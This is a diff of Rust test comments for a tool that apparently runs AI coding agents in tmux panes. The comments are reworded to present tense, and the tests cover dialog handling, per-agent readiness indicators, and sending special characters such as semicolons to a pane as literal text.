@@ -13037,7 +14287,7 @@ fn test_launch_dialog_derivation_matches_the_previous_literals() {
     );
 }
 
-/// Codex's mid-session MCP approval, previously hand-rolled in the refresh loop.
+/// Codex's mid-session MCP approval, answered from the spec table.
 #[test]
 #[cfg(feature = "test-mocks")]
 fn test_answer_session_dialogs_handles_codex_mcp_approval() {
@@ -13087,9 +14337,9 @@ fn test_answer_session_dialogs_requires_every_pattern() {
 // Per-agent attribution of indicators and launch dialogs (open question 1)
 // =============================================================================
 
-/// Another agent's readiness string in this agent's pane no longer counts.
-/// "Ask anything" is OpenCode's; a Claude pane showing it — in conversation
-/// output, say — used to read as an agent being up.
+/// Another agent's readiness string in this agent's pane does not count.
+/// "Ask anything" is OpenCode's, and a Claude pane showing it — in conversation
+/// output, say — must not read as an agent being up.
 #[test]
 #[cfg(feature = "test-mocks")]
 fn test_active_indicators_are_scoped_to_their_agent() {
@@ -13766,9 +15016,8 @@ fn a_printable_key_is_enqueued_as_literal_text() {
 #[test]
 #[cfg(feature = "test-mocks")]
 fn a_character_that_tmux_would_read_as_syntax_is_still_text() {
-    // `;` used to be sent through tmux's key-name lookup, where a standalone
-    // semicolon is a command separator — the keystroke never reached the pane.
-    // As text it is just a semicolon.
+    // Through tmux's key-name lookup a standalone `;` is a command separator and
+    // the keystroke never reaches the pane. As text it is just a semicolon.
     let (mut app, sink) = app_with_open_popup();
     for c in [';', '$', '#', '"', '\\'] {
         app.handle_key(key_event(KeyCode::Char(c), KeyModifiers::NONE))
